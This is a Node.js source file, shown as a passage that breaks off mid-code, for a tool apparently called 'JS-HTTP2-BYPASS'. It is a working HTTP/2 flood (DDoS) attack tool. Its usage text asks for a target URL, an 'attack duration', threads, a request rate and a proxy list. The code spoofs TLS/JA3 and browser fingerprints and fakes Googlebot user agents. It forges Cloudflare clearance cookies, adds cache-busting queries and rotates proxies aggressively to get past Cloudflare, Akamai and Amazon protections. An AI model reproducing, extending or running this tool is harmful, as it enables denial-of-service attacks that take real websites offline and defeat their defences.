

const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');
const { exec } = require('child_process');

// Enhanced error handling
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

process.env.UV_THREADPOOL_SIZE = os.cpus().length * 2;
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

// Enhanced process event handling
process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

// Global variables
const statusesQ = [];
let statuses = {};
let custom_table = 4096;
let custom_window = 65535;
let custom_header = 4096;
let custom_update = 65535;
let proxyConnections = 0;
let STREAMID_RESET = 0;
let timer = 0;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

// Argument parsing with enhanced options
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]) || os.cpus().length;
let initialRatelimit = parseInt(process.argv[6]);
const proxyfile = process.argv[7];

// Optional arguments
const queryIndex = process.argv.indexOf('--query') !== -1 ? process.argv.indexOf('--query') :
                  process.argv.indexOf('--randpath') !== -1 ? process.argv.indexOf('--randpath') : -1;
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const debugMode = process.argv.includes('--debug');
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ?
                 process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const fakeBotIndex = process.argv.indexOf('--fakebot');
const fakeBot = fakeBotIndex !== -1 && fakeBotIndex + 1 < process.argv.length ? process.argv[fakeBotIndex + 1].toLowerCase() === 'true' : false;
const authIndex = process.argv.indexOf('--authorization');
const authValue = authIndex !== -1 && authIndex + 1 < process.argv.length ? process.argv[authIndex + 1] : undefined;
const authProxyFlag = process.argv.includes('--auth');
const closeIndex = process.argv.indexOf('--close');
const closeOnError = closeIndex !== -1;
const streamMode = true;
const bypassMode = true;
const autoAdjustMode = false; // TẮT auto-adjust
const isFull = process.argv.includes('--full');

// Mode configuration
const ADJUSTMENT_WINDOW = 50;
const TARGET_SUCCESS_RATE = 0.75;
const ADJUSTMENT_FACTOR_DOWN = 0.7;
const ADJUSTMENT_FACTOR_UP = 1.1;
const MIN_RATELIMIT = 5;

// Dynamic Ratelimit Cycle Configuration
const CYCLE_NORMAL_DURATION_MS = 15 * 1000;  // Tăng thời gian
const CYCLE_BURST_DURATION_MS = 8 * 1000;    // Tăng thời gian
const CYCLE_COOL_DOWN_DURATION_MS = 7 * 1000; // Tăng thời gian
const BURST_MULTIPLIER = 1.5;  // Giảm multiplier
const COOL_DOWN_MULTIPLIER = 0.8; // Tăng multiplier

let cycleState = 'normal';
let cycleStartTime = Date.now();
let baseRatelimitForCycle = initialRatelimit;
let currentRatelimit = initialRatelimit;
let successCount = 0;
let errorCount = 0;

// Usage display
if (!reqmethod || !target || !time || !threads || !initialRatelimit || !proxyfile) {
    console.clear();
    console.log(`
     ${chalk.magenta('JS-HTTP2-BYPASS')} - Combined Advanced Bypass Tool
     Update: 10/01/2026 - Version: ${chalk.white.bold('2.0')}

     ${chalk.blue('Usage:')}
        node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> [Options]

     ${chalk.red('Example:')}
        node ${process.argv} GET https://target.com/ 120 16 90 proxy.txt --debug --full --connect

     ${chalk.yellow('Required Arguments:')}
        <method>    - GET or POST
        <target>    - Target URL (must be HTTPS)
        <time>      - Attack duration in seconds
        <threads>   - Number of worker threads (default: CPU cores)
        <ratelimit> - Initial request rate per second
        <proxy>     - Proxy file path

     ${chalk.green('Advanced Options:')}
      --query/--randpath 1/2/3 - Query string generation
      --cache                 - Enable cache bypass techniques
      --debug                 - Show status codes and debug info
      --full                  - Attack for big backends (Amazon, Akamai, Cloudflare)
      --delay <ms>           - Delay between requests (1-50 ms)
      --connect               - Keep proxy connections alive
      --cookie "value"       - Custom cookie (supports %RAND%)
      --bfm true/null        - Enable bypass bot fight mode
      --referer <url>        - Custom referer or "rand" for random domain
      --postdata "data"      - POST data for POST requests
      --authorization <type:value> - Authorization header
      --randrate             - Randomize rate (1-90) for bypass
      --header "name:value"  - Custom headers (separate with #)
      --fakebot true/false   - Use bot User-Agents
      --auth                 - Use proxy authentication (ip:port:user:pass)
      --close                - Close connections on 403/429
      --http 1/2/mix        - Force HTTP version

     ${chalk.cyan('Features:')}
      - Advanced HTTP/2 Streaming with aggressive request rates
      - TLS/HTTP Fingerprinting bypass
      - Automatic rate limit adjustment
      - Dynamic ratelimit cycling (Normal → Burst → Cool-down)
      - Proxy support with authentication
      - Browser profile randomization
      - Bot fight mode bypass
      - Cache bypass techniques
      - Multi-threaded cluster mode
    `);
    process.exit(1);
}

// Validate target URL
if (!target.startsWith('https://')) {
    console.error('Error: Only HTTPS protocol is supported');
    process.exit(1);
}

// Validate proxy file
if (!fs.existsSync(proxyfile)) {
    console.error('Error: Proxy file does not exist');
    process.exit(1);
}

// Load and validate proxies - CHỈNH SỬA: Thêm proxy rotation
const proxyRaw = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
const proxy = proxyRaw.filter(line => {
    const parts = line.split(':');
    if (authProxyFlag) {
        return parts.length === 4 && !isNaN(parts[1]);
    } else {
        return parts.length === 2 && !isNaN(parts[1]);
    }
});

if (proxy.length === 0) {
    console.error('Error: No valid proxies found');
    process.exit(1);
}

const url = new URL(target);

// Utility functions
function getRandomChar() {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    return alphabet[Math.floor(Math.random() * alphabet.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function shuffle(array) {
    if (!array || array.length === 0) return array;
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateLegitIP() {
    const subnets = [
        '8.8.8.', '8.8.4.', '1.1.1.', '1.0.0.',
        '172.217.', '172.253.', '31.13.', '157.240.',
        '104.244.', '199.16.', '172.64.', '104.18.'
    ];
    const subnet = subnets[Math.floor(Math.random() * subnets.length)];
    return subnet + Math.floor(Math.random() * 255);
}

// HTTP/2 Frame Functions
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const payloadLength = Buffer.isBuffer(payload) ? payload.length : Buffer.byteLength(payload);
    let frame = Buffer.alloc(9);

    frame.writeUInt32BE(payloadLength << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);

    if (payloadLength > 0) {
        const payloadBuffer = Buffer.isBuffer(payload) ? payload : Buffer.from(payload);
        frame = Buffer.concat([frame, payloadBuffer]);
    }
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;

    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5) & 0x7FFFFFFF;
    const offset = flags & 0x20 ? 5 : 0;

    if (data.length < 9 + offset + length) return null;

    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
    }

    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return encodeFrame(streamId, 3, payload, 0);
}

// Browser Profiles - UPDATED để tránh signature 78
const browserProfiles = {
    'chrome': {
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES256-GCM-SHA384'
        ],
        signatureAlgorithms: [
            'ecdsa_secp256r1_sha256',
            'rsa_pss_rsae_sha256',
            'rsa_pkcs1_sha256',
            'ecdsa_secp384r1_sha384',
            'rsa_pss_rsae_sha384'
        ],
        curves: ['X25519', 'secp256r1'],
        extensions: ['0', '23', '65281', '10', '11', '35', '16', '5', '13']
    },
    'firefox': {
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-CHACHA20-POLY1305',
            'ECDHE-RSA-CHACHA20-POLY1305'
        ],
        signatureAlgorithms: [
            'ecdsa_secp256r1_sha256',
            'ecdsa_secp384r1_sha384',
            'rsa_pss_rsae_sha256',
            'rsa_pss_rsae_sha384',
            'rsa_pkcs1_sha256'
        ],
        curves: ['X25519', 'secp256r1', 'secp384r1'],
        extensions: ['0', '23', '65281', '10', '11', '35', '16', '5', '13']
    },
    'edge': {
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES256-GCM-SHA384'
        ],
        signatureAlgorithms: [
            'ecdsa_secp256r1_sha256',
            'rsa_pss_rsae_sha256',
            'rsa_pkcs1_sha256',
            'ecdsa_secp384r1_sha384',
            'rsa_pss_rsae_sha384'
        ],
        curves: ['X25519', 'secp256r1'],
        extensions: ['0', '5', '10', '11', '13', '16', '18', '23', '35']
    }
};

function generateBrowserFingerprint(browserType, ja3Fingerprint) {
    const desktopScreenSizes = [
        { width: 1920, height: 1080 },
        { width: 1366, height: 768 },
        { width: 1536, height: 864 },
        { width: 1440, height: 900 },
        { width: 1600, height: 900 },
        { width: 2560, height: 1440 },
        { width: 3840, height: 2160 }
    ];

    const languages = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "en-US,en;q=0.8,es;q=0.6",
        "en-CA,en;q=0.9",
        "en-AU,en;q=0.9",
        "en-US,en;q=0.9,fr;q=0.8,de;q=0.7"
    ];

    const baseVersion = getRandomInt(120, 131);
    const buildVersion = getRandomInt(6000, 8000);
    const subBuild = getRandomInt(150, 350);

    let userAgent;
    let sextoy;

    if (fakeBot) {
        const legitimateBots = [
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36'
        ];
        userAgent = legitimateBots[Math.floor(Math.random() * legitimateBots.length)];
        sextoy = '"Not A;Brand";v="99", "Chromium";v="' + baseVersion + '"';
    } else {
        if (browserType === 'chrome') {
            userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${baseVersion}.0.${buildVersion}.${subBuild} Safari/537.36`;
            sextoy = `"Google Chrome";v="${baseVersion}", "Chromium";v="${baseVersion}", "Not?A_Brand";v="99"`;
        } else if (browserType === 'firefox') {
            userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${getRandomInt(120, 130)}.0) Gecko/20100101 Firefox/${getRandomInt(120, 130)}.0`;
            sextoy = `"Firefox";v="${baseVersion}"`;
        } else if (browserType === 'edge') {
            userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${baseVersion}.0.0.0 Safari/537.36 Edg/${baseVersion}.0.0.0`;
            sextoy = `"Microsoft Edge";v="${baseVersion}", "Chromium";v="${baseVersion}", "Not?A_Brand";v="99"`;
        } else {
            userAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${baseVersion} Safari/605.1.15`;
            sextoy = `"Safari";v="${baseVersion}"`;
        }
    }

    const screen = desktopScreenSizes[Math.floor(Math.random() * desktopScreenSizes.length)];

    return {
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.width - getRandomInt(0, 30),
            availHeight: screen.height - getRandomInt(40, 120),
            colorDepth: getRandomInt(24, 32),
            pixelDepth: getRandomInt(24, 32)
        },
        navigator: {
            language: languages[Math.floor(Math.random() * languages.length)],
            languages: ['en-US', 'en', Math.random() > 0.7 ? 'es' : 'fr'],
            doNotTrack: Math.random() > 0.6 ? '1' : null,
            hardwareConcurrency: [4, 6, 8, 12, 16, 24][Math.floor(Math.random() * 6)],
            userAgent: userAgent,
            sextoy: sextoy,
            deviceMemory: [4, 8, 16, 32][Math.floor(Math.random() * 4)],
            maxTouchPoints: 0,
            webdriver: false,
            cookiesEnabled: true,
            platform: 'Win32',
            vendor: 'Google Inc.'
        },
        timezone: getRandomInt(-720, 720),
        ja3: crypto.randomBytes(32).toString('hex'),
        connectionId: crypto.randomBytes(32).toString('hex'),
        createdAt: Date.now() + getRandomInt(-5000, 5000),
        browserType: browserType,
        browserVersion: baseVersion
    };
}

function updateCycleState() {
    const elapsed = Date.now() - cycleStartTime;
    if (cycleState === 'normal' && elapsed >= CYCLE_NORMAL_DURATION_MS) {
        cycleState = 'burst';
        cycleStartTime = Date.now();
        if (debugMode && Math.random() < 0.01) {
            console.log(`Worker ${process.pid}: Entering BURST phase.`);
        }
    } else if (cycleState === 'burst' && elapsed >= CYCLE_BURST_DURATION_MS) {
        cycleState = 'cool-down';
        cycleStartTime = Date.now();
        if (debugMode && Math.random() < 0.01) {
            console.log(`Worker ${process.pid}: Entering COOL-DOWN phase.`);
        }
    } else if (cycleState === 'cool-down' && elapsed >= CYCLE_COOL_DOWN_DURATION_MS) {
        cycleState = 'normal';
        cycleStartTime = Date.now();
        if (debugMode && Math.random() < 0.01) {
            console.log(`Worker ${process.pid}: Entering NORMAL phase.`);
        }
    }
}

// Query handling - IMPROVED để tránh pattern
function handleQuery(query) {
    if (query === '1') {
        // Sử dụng các pattern khác nhau
        const patterns = [
            () => url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + Date.now() + '-0-' + randstrr(8),
            () => url.pathname + '?_=' + Date.now() + '&v=' + Math.random().toString(36).substring(7),
            () => url.pathname + '?cache=' + crypto.randomBytes(4).toString('hex') + '&ts=' + Date.now(),
            () => url.pathname + '?ref=' + randstr(8) + '&cb=' + Date.now().toString(36)
        ];
        return patterns[Math.floor(Math.random() * patterns.length)]();
    } else if (query === '2') {
        return url.pathname + `?${getRandomChar()}=${randstr(getRandomInt(3, 10))}`;
    } else if (query === '3') {
        const params = ['q', 's', 'search', 'query', 'term', 'keyword'];
        const param1 = params[Math.floor(Math.random() * params.length)];
        const param2 = params[Math.floor(Math.random() * params.length)];
        return url.pathname + `?${param1}=${generateRandomString(4, 8)}&${param2}=${generateRandomString(4, 8)}`;
    }
    return url.pathname;
}

// Cache bypass - IMPROVED variability
function generateCacheQuery() {
    const timestamp = Date.now();
    const cacheBypassQueries = [
        `?v=${timestamp}`,
        `?_=${timestamp}`,
        `?cb=${crypto.randomBytes(4).toString('hex')}`,
        `?nocache=${timestamp}`,
        `?t=${timestamp.toString(36)}`,
        `?r=${Math.random().toString(36).substring(2)}`
    ];
    return cacheBypassQueries[Math.floor(Math.random() * cacheBypassQueries.length)];
}

// Authorization header
function generateAuthorizationHeader(authValue) {
    if (!authValue) return null;
    const [type, ...valueParts] = authValue.split(':');
    const value = valueParts.join(':');

    if (type.toLowerCase() === 'bearer') {
        if (value === '%RAND%') {
            // Tạo JWT token hợp lệ hơn
            const header = { alg: 'HS256', typ: 'JWT' };
            const payload = {
                sub: 'user_' + randstr(8),
                iat: Math.floor(Date.now() / 1000),
                exp: Math.floor(Date.now() / 1000) + 3600,
                jti: crypto.randomBytes(16).toString('hex')
            };
            const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
            const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
            const signature = crypto.createHmac('sha256', crypto.randomBytes(32))
                .update(`${encodedHeader}.${encodedPayload}`)
                .digest('base64url');
            return `Bearer ${encodedHeader}.${encodedPayload}.${signature}`;
        }
        return `Bearer ${value.replace('%RAND%', randstr(32))}`;
    } else if (type.toLowerCase() === 'basic') {
        if (value === '%RAND%') {
            const randomUser = 'user_' + randstr(8);
            const randomPass = randstr(16);
            return `Basic ${Buffer.from(`${randomUser}:${randomPass}`).toString('base64')}`;
        }
        return `Basic ${Buffer.from(value).toString('base64')}`;
    }
    return `${type} ${value.replace('%RAND%', randstr(16))}`;
}

// Colorize status codes for display
function colorizeStatus(status, count) {
    const greenStatuses = ['200', '201', '204'];
    const redStatuses = ['403', '429'];
    const yellowStatuses = ['503', '502', '500'];
    const blueStatuses = ['400', '404'];

    let coloredStatus;
    if (greenStatuses.includes(status)) {
        coloredStatus = chalk.green.bold(status);
    } else if (redStatuses.includes(status)) {
        coloredStatus = chalk.red.bold(status);
    } else if (yellowStatuses.includes(status)) {
        coloredStatus = chalk.yellow.bold(status);
    } else if (blueStatuses.includes(status)) {
        coloredStatus = chalk.blue.bold(status);
    } else {
        coloredStatus = chalk.gray.bold(status);
    }

    return `${coloredStatus}: ${chalk.underline(count)}`;
}

// Cookie generation for BFM - IMPROVED
let hcookie = '';
let currentRefererValue = refererValue === 'rand' ? 'https://' + randstr(8) + ".com" : refererValue;

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    // Tạo cookies hợp lệ hơn
    const timestamp = Date.now();
    const cfBmToken = `${randstr(20)}_${randstr(15)}-${timestamp}-${getRandomInt(0, 2)}`;
    const cfClearance = `${randstr(30)}_${randstr(6)}-${timestamp}-0-${getRandomInt(1, 3)}`;
    hcookie = `__cf_bm=${cfBmToken}; cf_clearance=${cfClearance}`;
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        // Tạo multiple random cookies
        const cookies = [];
        for (let i = 0; i < getRandomInt(1, 4); i++) {
            cookies.push(`${randstr(6)}=${randstr(12)}`);
        }
        hcookie = hcookie ? `${hcookie}; ${cookies.join('; ')}` : cookies.join('; ');
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

function generateDynamicJA3(profile) {
    if (!profile) {
        return {
            ciphers: browserProfiles.chrome.ciphers,
            signatureAlgorithms: browserProfiles.chrome.signatureAlgorithms,
            curves: ['X25519', 'secp256r1', 'secp384r1'],
            extensions: ['0', '23', '65281', '10', '11', '35', '16', '5', '13', '43'],
            timestamp: Date.now()
        };
    }

    // More aggressive randomization
    const cipherCount = getRandomInt(7, 12);
    const sigAlgCount = getRandomInt(4, 8);
    const extCount = getRandomInt(6, 12);

    return {
        ciphers: shuffle([...profile.ciphers, ...browserProfiles.chrome.ciphers]).slice(0, cipherCount),
        signatureAlgorithms: shuffle([...profile.signatureAlgorithms, ...browserProfiles.chrome.signatureAlgorithms]).slice(0, sigAlgCount),
        curves: shuffle([...profile.curves, 'X25519', 'secp256r1', 'secp384r1', 'X448']).slice(0, getRandomInt(3, 5)),
        extensions: shuffle([...profile.extensions, '43', '45', '51', '65037', '65281']).slice(0, extCount),
        timestamp: Date.now()
    };
}



// ENHANCED: Global variables for high-performance (keeping same names)
const activeConnections = new Map();
const proxyUsage = new Map();
const CONNECTION_LIMIT_PER_WORKER = 150; // Keeping same name, but will use more aggressive logic
const PROXY_RATE_LIMIT = 15; // Keeping same name
const MAX_REQUESTS_PER_CONNECTION = 100; // Keeping same name
const MIN_REQUEST_DELAY = 30; // Keeping same name
const BACKOFF_ON_GOAWAY = 3000; // Keeping same name
let lastGoAwayTime = 0;
let consecutiveGoAways = 0;

function canUseProxy(proxyLine) {
    const now = Date.now();
    if (!proxyUsage.has(proxyLine)) {
        proxyUsage.set(proxyLine, []);
    }
    const usage = proxyUsage.get(proxyLine);
    const recent = usage.filter(t => now - t < 5000);
    proxyUsage.set(proxyLine, recent);
    if (recent.length >= PROXY_RATE_LIMIT) return false;
    recent.push(now);
    return true;
}
let proxyIndex = 0;

function createDirectConnection(fingerprint, ja3Fingerprint) {
    const tlsOptions = {
        host: url.hostname,
        port: 443,
        ALPNProtocols: ['h2', 'http/1.1'],
        servername: url.hostname,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        rejectUnauthorized: false,
        timeout: 15000,
        ciphers: ja3Fingerprint.ciphers.join(':'),
        secureOptions:
            crypto.constants.SSL_OP_NO_SSLv2 |
            crypto.constants.SSL_OP_NO_SSLv3 |
            crypto.constants.SSL_OP_NO_TLSv1 |
            crypto.constants.SSL_OP_NO_TLSv1_1 |
            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
        honorCipherOrder: true
    };

    const tlsSocket = tls.connect(tlsOptions);

    tlsSocket.on('secureConnect', () => {
        handleHTTP2Connection(tlsSocket, fingerprint);
    });

    tlsSocket.on('error', () => {
        tlsSocket.destroy();
        setTimeout(go, 200);
    });

    tlsSocket.on('close', () => {
        setTimeout(go, 100);
    });

    tlsSocket.setTimeout(20000, () => {
        tlsSocket.destroy();
    });
}

function go() {
    try {
        const timeSinceLastGoAway = Date.now() - lastGoAwayTime;
        if (consecutiveGoAways > 3 && timeSinceLastGoAway < BACKOFF_ON_GOAWAY) {
            setTimeout(go, BACKOFF_ON_GOAWAY - timeSinceLastGoAway);
            return;
        }

        // More aggressive connection creation
        if (activeConnections.size >= Math.min(5000, CONNECTION_LIMIT_PER_WORKER * 10)) {
            setTimeout(go, getRandomInt(1, 20)); // Much faster retry
            return;
        }

        let proxyLine;
        // More aggressive proxy rotation
        if (proxyConnections < proxy.length * 10) { // Changed from *2 to *10
            proxyLine = proxy[proxyIndex % proxy.length];
            proxyIndex++;
        } else {
            proxyLine = proxy[Math.floor(Math.random() * proxy.length)];
        }

        if (!proxyLine || !canUseProxy(proxyLine)) {
            setTimeout(go, getRandomInt(1, 50)); // Faster retry
            return;
        }

        let proxyHost, proxyPort, proxyUser, proxyPass;
        const parts = proxyLine.split(':');

        if (authProxyFlag && parts.length >= 4) {
            [proxyHost, proxyPort, proxyUser, proxyPass] = parts;
        } else if (parts.length >= 2) {
            [proxyHost, proxyPort] = parts;
        } else {
            setTimeout(go, 1); // Immediate retry
            return;
        }

        proxyPort = parseInt(proxyPort, 10);
        if (!proxyHost || !proxyPort || isNaN(proxyPort) || proxyPort <= 0 || proxyPort > 65535) {
            setTimeout(go, 1);
            return;
        }

        // Enhanced browser selection
        const browsers = ['chrome', 'chrome', 'chrome', 'firefox', 'edge', 'safari', 'chrome', 'chrome'];
        const browserType = browsers[Math.floor(Math.random() * browsers.length)];
        const profile = browserProfiles[browserType];

        if (!profile) {
            setTimeout(go, 1);
            return;
        }

        const ja3Fingerprint = generateDynamicJA3(profile);
        const fingerprint = generateBrowserFingerprint(browserType, ja3Fingerprint);

        // Enhanced bypass features
        fingerprint.bypass = {
            antiCloudflare: true,
            antiAkamai: true,
            antiAmazon: true,
            antiDdg: true,
            antiBot: true,
            rotateJA3: true,
            useCustomCiphers: true,
            sessionTicket: true,
            ocspStapling: true,
            alpnShuffle: true
        };

        createProxyConnection(proxyHost, proxyPort, proxyUser, proxyPass, fingerprint, ja3Fingerprint);

    } catch (error) {
        setTimeout(go, getRandomInt(1, 10)); // Immediate retry on error
    }
}

function createProxyConnection(proxyHost, proxyPort, proxyUser, proxyPass, fingerprint, ja3Fingerprint) {
    const netSocket = net.connect({
        host: proxyHost,
        port: Number(proxyPort),
        timeout: 5000, // Faster timeout
        keepAlive: true
    }, () => {
        proxyConnections++;

        let connectRequest = `CONNECT ${url.hostname}:443 HTTP/1.1\r\n`;
        connectRequest += `Host: ${url.hostname}:443\r\n`;
        connectRequest += `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n`;
        connectRequest += `Proxy-Connection: keep-alive\r\n`;
        connectRequest += `Connection: keep-alive\r\n`;

        if (authProxyFlag && proxyUser && proxyPass) {
            const auth = Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64');
            connectRequest += `Proxy-Authorization: Basic ${auth}\r\n`;
        }
        connectRequest += `\r\n`;

        netSocket.write(connectRequest);

        let buffer = '';
        const timeout = setTimeout(() => {
            netSocket.destroy();
            setTimeout(go, 1);
        }, 5000);

        const dataHandler = (data) => {
            buffer += data.toString();

            if (buffer.includes('\r\n\r\n') || buffer.includes('\n\n')) {
                clearTimeout(timeout);
                netSocket.removeListener('data', dataHandler);

                if (buffer.includes('200') || buffer.toLowerCase().includes('connection established')) {
                    const tlsOptions = {
                        socket: netSocket,
                        ALPNProtocols: ['h2', 'http/1.1'],
                        servername: url.hostname,
                        minVersion: 'TLSv1.2',
                        maxVersion: 'TLSv1.3',
                        rejectUnauthorized: false,
                        timeout: 8000,
                        ciphers: ja3Fingerprint.ciphers.join(':'),
                        secureOptions:
